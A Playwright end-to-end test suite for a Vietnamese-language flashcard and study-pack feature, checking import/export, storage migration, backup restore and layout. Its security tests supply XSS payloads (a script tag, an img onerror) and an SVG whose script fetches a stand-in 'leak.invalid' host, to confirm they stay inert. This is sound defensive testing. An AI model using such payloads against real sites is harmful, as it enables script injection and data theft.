import { expect, test, type Page } from '@playwright/test'
import { readFile, writeFile } from 'node:fs/promises'
import { createPdfDocument } from '../src/application/document'
import { completeExtraction } from '../src/application/pdf-text'
import { emptyLibrary } from '../src/application/library'

const pack = {
  type: 'oneword-study-pack', schemaVersion: 1, id: 'pack-fixture', title: 'Imported learning', description: 'Synthetic content only', createdAt: '2026-09-17T00:00:00.000Z', updatedAt: '2026-09-17T00:00:00.000Z',
  decks: [{ id: 'deck-fixture', packId: 'pack-fixture', title: 'First deck', order: 0 }],
  cards: [{ id: 'card-fixture', deckId: 'deck-fixture', front: { text: 'Imported question' }, back: { text: 'Imported answer' }, order: 0, revision: 1 }],
}
const errors = new WeakMap<Page, string[]>()
test.beforeEach(async ({ page }) => { const list: string[] = []; errors.set(page, list); page.on('pageerror', e => list.push(e.message)); page.on('console', m => { if (m.type() === 'error') list.push(m.text()) }) })
test.afterEach(async ({ page }) => { expect(errors.get(page)).toEqual([]) })
async function study(page: Page) { await page.goto('/'); await page.getByRole('button', { name: 'Học / Flashcards', exact: true }).click() }
async function inspect(page: Page) {
  return page.evaluate(async () => {
    const db = await new Promise<IDBDatabase>((resolve, reject) => { const r = indexedDB.open('oneword-reader'); r.onsuccess = () => resolve(r.result); r.onerror = () => reject(r.error) })
    try {
      const tx = db.transaction(['packs', 'documents', 'positions', 'meta', 'settings'])
      const read = (name: string) => new Promise<unknown[]>((resolve, reject) => { const r = tx.objectStore(name).getAll(); r.onsuccess = () => resolve(r.result); r.onerror = () => reject(r.error) })
      return { version: db.version, packs: await read('packs'), documents: await read('documents'), positions: await read('positions'), meta: await read('meta'), settings: await read('settings') }
    } finally { db.close() }
  })
}
async function preview(page: Page, value: unknown = pack) {
  await page.getByRole('button', { name: 'Nhập Study Pack', exact: true }).click()
  await page.getByLabel('JSON Study Pack', { exact: true }).fill(JSON.stringify(value))
  await page.getByRole('button', { name: 'Kiểm tra và xem trước' }).click()
}
async function confirm(page: Page) {
  await page.getByRole('button', { name: 'Xác nhận nhập Study Pack' }).click()
  await expect(page.getByRole('main').getByRole('status')).toContainText('Đã nhập Study Pack')
  await expect(page.getByTestId('save-status')).toHaveText('Đã lưu trên thiết bị')
}

test('manual pack/deck/card → reload → front first → reveal; edit/move/delete persists', async ({ page }, info) => {
  await study(page)
  await page.getByRole('button', { name: 'Tạo pack', exact: true }).click()
  await page.getByLabel('Tên pack', { exact: true }).fill('Manual pack')
  await page.getByLabel('Mô tả pack').fill('Local manual learning')
  await page.getByRole('button', { name: 'Lưu pack mới' }).click()
  await page.getByLabel('Tên bộ thẻ mới').fill('Manual deck')
  await page.getByRole('button', { name: 'Tạo bộ thẻ', exact: true }).click()
  await page.getByRole('button', { name: 'Tạo thẻ', exact: true }).click()
  await page.getByLabel('Mặt trước — chữ', { exact: true }).fill('Manual question')
  await page.getByLabel('Mặt sau — chữ', { exact: true }).fill('Hidden manual answer')
  await page.getByLabel('Nhãn (cách nhau bằng dấu phẩy)').fill('local, sample')
  await page.getByRole('button', { name: 'Lưu thẻ', exact: true }).click()
  await expect(page.getByRole('article', { name: 'Thẻ đang học' })).toContainText('Manual question')
  await expect(page.getByText('Hidden manual answer', { exact: true })).toHaveCount(0)
  await page.reload(); await page.getByRole('button', { name: 'Học / Flashcards' }).click()
  await expect(page.getByRole('article')).toContainText('Manual question')
  await expect(page.getByText('Hidden manual answer', { exact: true })).toHaveCount(0)
  await page.getByRole('button', { name: 'Xem đáp án' }).click()
  await expect(page.getByRole('article')).toContainText('Hidden manual answer')
  await expect(page.getByRole('article')).not.toContainText('Manual question')
  await page.screenshot({ path: 'artifacts/m3a-study-reveal.png', fullPage: true })
  const before = await inspect(page)
  await page.getByLabel('Tên bộ thẻ mới').fill('Moved deck')
  await page.getByRole('button', { name: 'Tạo bộ thẻ', exact: true }).click()
  await page.getByLabel('Chọn bộ thẻ', { exact: true }).selectOption({ label: 'Manual deck' })
  await page.getByRole('button', { name: 'Sửa thẻ', exact: true }).click()
  await page.getByLabel('Mặt trước — chữ', { exact: true }).fill('Edited question')
  await page.getByLabel('Bộ thẻ của thẻ').selectOption({ label: 'Moved deck' })
  await page.getByRole('button', { name: 'Lưu thẻ', exact: true }).click()
  await page.getByLabel('Chọn bộ thẻ', { exact: true }).selectOption({ label: 'Moved deck' })
  await expect(page.getByRole('article')).toContainText('Edited question')
  const edited = await inspect(page)
  const oldPack = before.packs[0] as { cards: { id: string }[] }, newPack = edited.packs[0] as { cards: { id: string; revision: number }[] }
  expect(newPack.cards[0].id).toBe(oldPack.cards[0].id); expect(newPack.cards[0].revision).toBe(2)
  page.once('dialog', dialog => dialog.dismiss())
  await page.getByRole('button', { name: 'Xóa thẻ', exact: true }).click()
  await expect(page.getByRole('article')).toContainText('Edited question')
  page.once('dialog', dialog => dialog.accept())
  await page.getByRole('button', { name: 'Xóa thẻ', exact: true }).click()
  await expect(page.getByText('Bộ thẻ chưa có thẻ.', { exact: false })).toBeVisible()
  await page.reload(); await page.getByRole('button', { name: 'Học / Flashcards' }).click()
  expect((await inspect(page)).packs).toMatchObject([{ cards: [] }])
  await info.attach('manual-study', { body: JSON.stringify({ before, edited, afterDelete: await inspect(page) }), contentType: 'application/json' })
})

test('manual image fields persist without requests and can be removed', async ({ page, baseURL }) => {
  const external: string[] = []
  page.on('request', request => { if (new URL(request.url()).origin !== baseURL) external.push(request.url()) })
  await study(page); await preview(page); await confirm(page)
  await page.getByRole('button', { name: 'Sửa thẻ', exact: true }).click()
  await page.getByLabel('Mặt trước — URL ảnh HTTPS', { exact: true }).fill('https://images.example.test/manual.png')
  await page.getByLabel('Mặt trước — mô tả ảnh', { exact: true }).fill('Manual image description')
  await page.getByLabel('Mặt trước — chú thích', { exact: true }).fill('Manual caption')
  await page.getByLabel('Mặt trước — ảnh thiết yếu', { exact: true }).check()
  await page.getByRole('button', { name: 'Lưu thẻ', exact: true }).click()
  await expect(page.getByRole('article')).toContainText('Manual caption')
  await page.reload(); await page.getByRole('button', { name: 'Học / Flashcards' }).click()
  await expect(page.getByRole('article')).toContainText('Ảnh thiết yếu')
  expect((await inspect(page)).packs).toMatchObject([{ cards: [{ front: { image: { url: 'https://images.example.test/manual.png', alt: 'Manual image description', caption: 'Manual caption', essential: true } } }] }])
  await page.getByRole('button', { name: 'Sửa thẻ', exact: true }).click()
  await page.getByRole('button', { name: 'Bỏ ảnh mặt trước', exact: true }).click()
  await page.getByRole('button', { name: 'Lưu thẻ', exact: true }).click()
  await expect(page.getByRole('article')).toContainText('Imported question')
  const saved = (await inspect(page)).packs[0] as { cards: { front: object; revision: number }[] }
  expect(saved.cards[0].front).toEqual({ text: 'Imported question' }); expect(saved.cards[0].revision).toBe(3)
  expect(external).toEqual([])
})

test('import preview writes nothing; export/delete/import round-trip preserves identities and excludes personal state', async ({ page, baseURL }, info) => {
  const requests: string[] = []
  page.on('request', r => { if (new URL(r.url()).origin !== baseURL || r.method() !== 'GET') requests.push(r.url()) })
  await study(page); await preview(page)
  await expect(page.getByRole('region', { name: 'Xem trước Study Pack' })).toContainText('1 bộ thẻ · 1 thẻ · 1 pack mới')
  expect((await inspect(page)).packs).toEqual([])
  await page.screenshot({ path: 'artifacts/m3a-import-preview.png', fullPage: true })
  await confirm(page)
  await expect(page.getByRole('article')).toContainText('Imported question')
  const before = await inspect(page)
  const download = page.waitForEvent('download')
  await page.getByRole('button', { name: 'Xuất Study Pack', exact: true }).click()
  const path = info.outputPath('study-pack.json'); await (await download).saveAs(path)
  const exported = JSON.parse(await readFile(path, 'utf8'))
  expect(exported).toEqual(pack)
  expect(Object.keys(exported)).not.toEqual(expect.arrayContaining(['positions', 'preferences', 'draft']))
  page.once('dialog', dialog => dialog.accept())
  await page.getByRole('button', { name: 'Xóa pack', exact: true }).click()
  await expect(page.getByText('Chưa có nội dung.', { exact: false })).toBeVisible()
  expect((await inspect(page)).packs).toEqual([])
  await page.getByRole('button', { name: 'Nhập Study Pack', exact: true }).click()
  await page.getByLabel('Chọn tệp Study Pack').setInputFiles(path)
  await expect(page.getByRole('region', { name: 'Xem trước Study Pack' })).toContainText('1 pack mới')
  expect((await inspect(page)).packs).toEqual([])
  await confirm(page)
  expect((await inspect(page)).packs).toEqual(before.packs)
  expect(requests).toEqual([])
  const evidence = JSON.stringify({ exported, before: before.packs, restored: (await inspect(page)).packs, unexpectedRequests: requests }, null, 2)
  await writeFile('artifacts/m3a-round-trip.json', evidence)
  await info.attach('study-pack-round-trip', { body: evidence, contentType: 'application/json' })
})

test('identical import is a no-op; changed pack or reused child IDs are blocked without partial writes', async ({ page }) => {
  await study(page); await preview(page); await confirm(page)
  const before = await inspect(page)
  await preview(page)
  await expect(page.getByRole('region', { name: 'Xem trước Study Pack' })).toContainText('1 pack đã có')
  await page.getByRole('button', { name: 'Xác nhận nhập Study Pack' }).click()
  await expect(page.getByRole('main').getByRole('status')).toContainText('trùng hoàn toàn')
  expect(await inspect(page)).toEqual(before)
  await preview(page, { ...pack, title: 'Changed title' })
  await expect(page.getByRole('alert')).toContainText('khác nội dung')
  await expect(page.getByRole('button', { name: 'Xác nhận nhập Study Pack' })).toBeDisabled()
  expect(await inspect(page)).toEqual(before)
  await page.getByRole('button', { name: 'Hủy nhập Study Pack' }).click()
  await preview(page, { ...pack, id: 'other-pack', decks: [{ ...pack.decks[0], packId: 'other-pack' }] })
  await expect(page.getByRole('alert')).toContainText('pack khác')
  expect(await inspect(page)).toEqual(before)
})

test('imported HTML remains literal text; image references are opt-in, anonymous, with failure fallback', async ({ page, context }, info) => {
  const imageRequests: { url: string; headers: Record<string, string> }[] = [], unexpected: string[] = [], dialogs: string[] = []
  const payload = '<script>alert(1)</script>'
  const malicious = { ...pack, cards: [{ ...pack.cards[0], front: { text: payload, image: { url: 'https://images.example.test/broken.png', alt: 'Essential diagram', caption: 'Image supplied by author', essential: true } }, back: { text: '<img src=x onerror=alert(2)>' } }] }
  await context.addCookies([{ name: 'private', value: 'must-not-send', domain: 'images.example.test', path: '/', secure: true, sameSite: 'None' }])
  await context.route('https://images.example.test/**', async route => { imageRequests.push({ url: route.request().url(), headers: await route.request().allHeaders() }); await route.fulfill({ status: 200, contentType: 'image/png', headers: { 'Access-Control-Allow-Origin': '*' }, body: 'not valid image bytes' }) })
  page.on('request', r => { if (r.url().includes('alert') || r.url().includes('leak')) unexpected.push(r.url()) })
  page.on('dialog', async d => { dialogs.push(d.message()); await d.dismiss() })
  await study(page); await preview(page, malicious)
  expect(imageRequests).toEqual([])
  await confirm(page)
  await expect(page.getByRole('article')).toContainText(payload)
  expect(await page.getByRole('article').locator('script, img').count()).toBe(0)
  expect(imageRequests).toEqual([])
  await page.getByRole('button', { name: 'Tải ảnh này' }).click()
  await expect(page.getByRole('article')).toContainText('Thiếu ảnh thiết yếu')
  await expect(page.getByRole('article')).toContainText('Essential diagram')
  await expect(page.getByRole('article')).toContainText('Image supplied by author')
  expect(imageRequests).toHaveLength(1)
  expect(imageRequests[0].headers.referer).toBeUndefined(); expect(imageRequests[0].headers.cookie).toBeUndefined()
  await page.getByRole('button', { name: 'Xem đáp án' }).click()
  await expect(page.getByRole('article')).toContainText('<img src=x onerror=alert(2)>')
  expect(await page.getByRole('article').locator('img').count()).toBe(0)
  expect(dialogs).toEqual([]); expect(unexpected).toEqual([])
  await page.screenshot({ path: 'artifacts/m3a-literal-content.png', fullPage: true })
  const evidence = JSON.stringify({ imageRequests, unexpected, dialogs, pageErrors: errors.get(page), persisted: (await inspect(page)).packs }, null, 2)
  await writeFile('artifacts/m3a-security.json', evidence); await info.attach('study-security', { body: evidence, contentType: 'application/json' })
})

test('HTTPS image loads only on request; SVG script is inert and hidden back images do not load', async ({ page, context }) => {
  const requested: string[] = []
  await context.route('https://images.example.test/**', async route => { requested.push(route.request().url()); await route.fulfill({ contentType: 'image/svg+xml', headers: { 'Access-Control-Allow-Origin': '*' }, body: '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><script>window.IMAGE_SCRIPT_EXECUTED=true;fetch("https://leak.invalid/")</script><rect width="100" height="100" fill="green"/></svg>' }) })
  const image = { url: 'https://images.example.test/front.svg', alt: 'Safe image context' }
  await study(page); await preview(page, { ...pack, cards: [{ ...pack.cards[0], front: { text: 'With image', image }, back: { text: 'Back image', image: { ...image, url: 'https://images.example.test/back.svg' } } }] }); await confirm(page)
  expect(requested).toEqual([])
  await page.getByRole('button', { name: 'Tải ảnh này' }).click()
  await expect.poll(() => page.getByAltText('Safe image context').evaluate((img: HTMLImageElement) => img.naturalWidth)).toBe(100)
  expect(requested).toEqual([image.url])
  expect(await page.evaluate(() => 'IMAGE_SCRIPT_EXECUTED' in window)).toBe(false)
  await page.getByRole('button', { name: 'Xem đáp án' }).click()
  expect(requested).toEqual([image.url])
})

test('invalid Study Pack reports human errors and never creates content', async ({ page }) => {
  await study(page); await page.getByRole('button', { name: 'Nhập Study Pack', exact: true }).click()
  for (const [value, message] of [
    ['{', 'Không đọc được JSON'],
    [JSON.stringify({ ...pack, type: 'wrong' }), 'không phải'],
    [JSON.stringify({ ...pack, schemaVersion: 3 }), 'phiên bản'],
    [JSON.stringify({ ...pack, cards: [...pack.cards, ...pack.cards] }), 'bị trùng'],
    [JSON.stringify({ ...pack, cards: [{ ...pack.cards[0], deckId: 'missing' }] }), 'Thẻ card-fixture tham chiếu bộ thẻ missing'],
    [JSON.stringify({ ...pack, cards: [{ ...pack.cards[0], front: { text: 'x', image: { url: 'data:image/png;base64,AA', alt: 'x' } } }] }), 'https://'],
  ]) {
    await page.getByLabel('JSON Study Pack', { exact: true }).fill(value)
    await page.getByRole('button', { name: 'Kiểm tra và xem trước' }).click()
    await expect(page.getByRole('alert')).toContainText(message)
    expect((await inspect(page)).packs).toEqual([])
    await expect(page.getByRole('button', { name: 'Xác nhận nhập Study Pack' })).toHaveCount(0)
  }
})

test('real M2 database migrates to current schema without losing PDF reader data, then backup restores both content and reader', async ({ page, context, baseURL }, info) => {
  const doc = createPdfDocument(completeExtraction([{ raw: 'Original PDF source', warnings: [] }], 'pdfjs-dist@6.3.289'), 'old.pdf', 'one two three')
  const data = { ...emptyLibrary(), documents: [doc], activeDocumentId: doc.id, positions: [{ documentId: doc.id, revisionId: doc.revisions[1].id, offset: 4, settings: emptyLibrary().preferences.reader, updatedAt: '2026-09-17T00:00:00.000Z' }] }
  await page.goto('/favicon.svg')
  await page.evaluate(async data => {
    const db = await new Promise<IDBDatabase>((resolve, reject) => { const r = indexedDB.open('oneword-reader', 20); r.onupgradeneeded = () => { for (const [name, keyPath] of [['documents', 'id'], ['positions', 'documentId'], ['settings', 'id'], ['meta', 'id']]) r.result.createObjectStore(name, { keyPath }) }; r.onsuccess = () => resolve(r.result); r.onerror = () => reject(r.error) })
    try { await new Promise<void>((resolve, reject) => { const tx = db.transaction(['documents', 'positions', 'settings', 'meta'], 'readwrite'); for (const doc of data.documents) tx.objectStore('documents').put(doc); for (const p of data.positions) tx.objectStore('positions').put(p); tx.objectStore('settings').put({ id: 'reader', ...data.preferences }); tx.objectStore('meta').put({ id: 'library', schemaVersion: 2, generation: 12, activeDocumentId: data.activeDocumentId, draft: null }); tx.oncomplete = () => resolve(); tx.onabort = () => reject(tx.error) }) } finally { db.close() }
  }, data)
  await page.goto('/')
  await expect(page.getByTestId('current-chunk')).toHaveText('two')
  await expect(page.getByTestId('save-status')).toHaveText('Đã lưu trên thiết bị')
  const migrated = await inspect(page)
  expect(migrated.version).toBe(50); expect(migrated.documents).toEqual(data.documents); expect(migrated.packs).toEqual([])
  await page.getByRole('button', { name: 'Học / Flashcards' }).click(); await preview(page); await confirm(page)
  await page.getByRole('button', { name: 'Đọc', exact: true }).click()
  const download = page.waitForEvent('download'); await page.getByRole('button', { name: 'Xuất sao lưu', exact: true }).click()
  const path = info.outputPath('personal-backup-v3.json'); await (await download).saveAs(path)
  const backup = JSON.parse(await readFile(path, 'utf8'))
  expect(backup.schemaVersion).toBe(5); expect(backup.data.packs).toEqual([pack])
  await page.goto('about:blank'); const cdp = await context.newCDPSession(page); await cdp.send('Storage.clearDataForOrigin', { origin: baseURL!, storageTypes: 'indexeddb' })
  await page.goto('/'); await page.getByLabel('Chọn tệp sao lưu').setInputFiles(path)
  await expect(page.getByRole('dialog')).toContainText('1 pack mới')
  await page.getByRole('button', { name: 'Xác nhận khôi phục' }).click()
  await expect(page.getByTestId('current-chunk')).toHaveText('two')
  await expect(page.getByTestId('save-status')).toHaveText('Đã lưu trên thiết bị')
  expect((await inspect(page)).documents).toEqual(data.documents); expect((await inspect(page)).packs).toEqual([pack])
  const evidence = JSON.stringify({ migrated, backup, restored: await inspect(page) }, null, 2)
  await writeFile('artifacts/m3a-migration.json', evidence); await info.attach('M2-migration-and-backup', { body: evidence, contentType: 'application/json' })
})

test('narrow study UI supports keyboard reveal and has no horizontal overflow', async ({ page }) => {
  await page.setViewportSize({ width: 390, height: 844 }); await study(page); await preview(page); await confirm(page)
  await page.getByRole('button', { name: 'Xem đáp án' }).focus(); await page.keyboard.press('Enter')
  await expect(page.getByRole('article')).toContainText('Imported answer')
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true)
  const header = await page.locator('.site-header').boundingBox(), content = await page.locator('#study').boundingBox()
  expect(header!.y + header!.height).toBeLessThanOrEqual(content!.y)
  await page.screenshot({ path: 'artifacts/m3a-study-mobile.png', fullPage: true })
})
